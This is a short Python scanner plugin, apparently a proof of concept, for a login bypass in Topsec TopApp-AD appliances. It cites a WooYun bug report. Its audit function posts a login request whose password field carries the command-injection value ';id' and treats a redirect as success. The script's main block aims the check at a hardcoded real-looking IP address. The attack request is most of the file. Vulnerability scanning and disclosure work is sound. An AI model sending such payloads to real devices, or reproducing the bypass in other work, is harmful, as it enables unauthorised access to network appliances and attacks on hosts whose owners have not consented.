#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 天融信TopApp-AD Login Bypass
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0116727
import re
import random

def assign(service, arg):
    if service == "topsec":
        return True, arg

def audit(arg):
    name = ''.join(random.sample('abcdefghjklmn',4))
    header = "Content-Type: application/x-www-form-urlencoded"
    data = "userName={name}&password=;id&x=38&y=28".format(name=name)
    target = arg+"login_check.php"
    code, head, res, errcode, _ = curl.curl2(target,header=header,post=data)
    if code == 302 and 'location: redirect.php' in head:
        security_hole(target)

        

if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'http://61.54.222.39:8080/')[1])